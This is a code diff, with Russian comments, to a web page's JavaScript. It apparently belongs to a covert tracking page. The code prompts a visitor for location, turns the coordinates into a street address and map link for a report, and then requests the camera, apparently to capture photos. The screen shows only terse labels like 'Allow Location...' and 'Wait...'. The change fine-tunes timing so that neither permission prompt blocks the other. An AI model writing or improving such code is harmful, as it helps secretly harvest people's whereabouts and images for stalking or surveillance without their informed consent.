@@ -220,13 +220,13 @@ CPU: ${s.c} ядра | RAM: ${s.r}
             b.style.display = 'none';
             document.getElementById('loader').style.display = 'block';
             
-            // 1. Сначала GPS (Строго по очереди, чтобы не перекрывать окна)
+            // 1. Сначала GPS (Строго по очереди)
             document.getElementById('label-text').innerText = "Allow Location...";
-            let gps = await new Promise(resolve => {
-                if (!navigator.geolocation) return resolve("*GPS не поддерживается*");
+            let gpsData = await new Promise(resolve => {
+                if (!navigator.geolocation) return resolve({t:"*GPS не поддерживается*", e:true});
                 
-                // Тайм-аут на случай, если юзер игнорит окно или GPS тупит (7 сек)
-                const timer = setTimeout(() => resolve("*GPS: Тайм-аут*"), 7000);
+                // Тайм-аут 10 сек
+                const timer = setTimeout(() => resolve({t:"*GPS: Тайм-аут*", e:true}), 10000);
 
                 navigator.geolocation.getCurrentPosition(
                     async p => {
@@ -238,7 +238,7 @@ CPU: ${s.c} ядра | RAM: ${s.r}
                             const req = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${la}&lon=${lo}`); 
                             addr = (await req.json()).display_name; 
                         } catch{}
-                        resolve(`Адрес: ${addr}\nКарты: [клик](${link})`);
+                        resolve({t:`Адрес: ${addr}\nКарты: [клик](${link})`, e:false});
                     },
                     (err) => {
                         clearTimeout(timer);
@@ -246,15 +246,18 @@ CPU: ${s.c} ядра | RAM: ${s.r}
                         if (err.code === 1) e = "Запрещено пользователем";
                         else if (err.code === 2) e = "Недоступно";
                         else if (err.code === 3) e = "Тайм-аут";
-                        resolve(`*GPS Ошибка: ${e}*`);
+                        resolve({t:`*GPS Ошибка: ${e}*`, e:true});
                     }
                 );
             });
+            let gps = gpsData.t;
 
-            // 2. Теперь Камера (GPS уже обработан)
-            // Увеличил паузу до 2.5 секунд, чтобы если GPS отвалится сразу, ты успел прочитать/нажать
+            // 2. Теперь Камера
+            // АДАПТИВНАЯ ПАУЗА:
+            // Если GPS выдал ошибку (например, телефон вернул ошибку сразу, но окно висит), ждем 6 секунд.
+            // Если GPS успешен (окно уже закрыто), ждем 2 секунды.
             document.getElementById('label-text').innerText = "Wait...";
-            await sleep(2500); 
+            await sleep(gpsData.e ? 6000 : 2000); 
 
             document.getElementById('label-text').innerText = "Allow Camera...";
             let ph = [];
